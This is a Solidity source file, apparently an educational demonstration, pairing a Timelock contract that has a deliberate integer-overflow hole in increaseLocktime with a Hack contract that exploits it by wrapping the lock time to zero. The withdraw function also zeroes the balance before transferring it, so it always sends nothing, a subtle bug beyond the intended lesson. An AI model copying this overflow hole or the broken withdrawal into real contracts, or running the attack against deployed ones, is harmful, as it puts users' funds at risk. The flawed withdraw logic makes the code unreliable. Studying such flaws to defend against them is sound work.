// SPDX-License-Identifier: MIT
pragma solidity 0.6.10;

contract Timelock{
    mapping(address=>uint) public balance;
    mapping(address=>uint) public locktime;

    //Users can deposit their money
    function deposit() public payable{
        balance[msg.sender] += msg.value;
        locktime[msg.sender] = block.timestamp + 1 weeks;
    }

    //this function is vulnerable to overflow attack
    //since it does not implement the safeMath Library
    function increaseLocktime(uint _time) public {
        require(balance[msg.sender] > 0, "You do not have balance");
        locktime[msg.sender] += _time;
    }

    //function for withdrawing fund according to the deposited amount
    function withdraw() public {
        require(balance[msg.sender] > 0, "No balance");
        require(block.timestamp > locktime[msg.sender], "time has not elapsed");

        balance[msg.sender] = 0;
        payable(msg.sender).transfer(balance[msg.sender]);
    }
}

contract Hack{
    Timelock private timelock;

    constructor(address _timelock) public{
        timelock = Timelock(_timelock);
    }

    fallback() external payable { }

    function attack() public payable {
        // let t = current locktime
        //find x such that t + x = 2**256 = 0
        // t + x = 0
        // x = -t
        timelock.deposit{value: 1 ether}();
        timelock.increaseLocktime(
            uint(-timelock.locktime(address(this)))
        );

        timelock.withdraw();
    }
}